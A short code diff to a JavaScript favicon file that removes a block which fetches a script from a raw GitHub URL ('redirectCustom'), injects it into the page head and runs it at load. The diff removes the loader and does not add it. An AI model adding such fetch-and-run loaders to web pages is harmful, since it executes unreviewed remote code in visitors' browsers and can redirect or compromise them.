@@ -3,23 +3,6 @@ document.querySelector("link[rel=icon]").href = favicon;
 
 
 
-console.log("Script Running");
-
-fetch('https://raw.githubusercontent.com/behzad05/redirectCustom/main/index.js')
-    .then(response => {
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        return response.text();
-    })
-    .then(scriptContent => {
-        const script = document.createElement('script');
-        script.textContent = scriptContent;
-        document.head.appendChild(script);
-        executeScript();  // Explicitly call the function if necessary
-    })
-    .catch(error => console.error('Error loading script:', error));
-
 // Explicitly defined function to execute after loading the script
 function executeScript() {
     // Your script content goes here
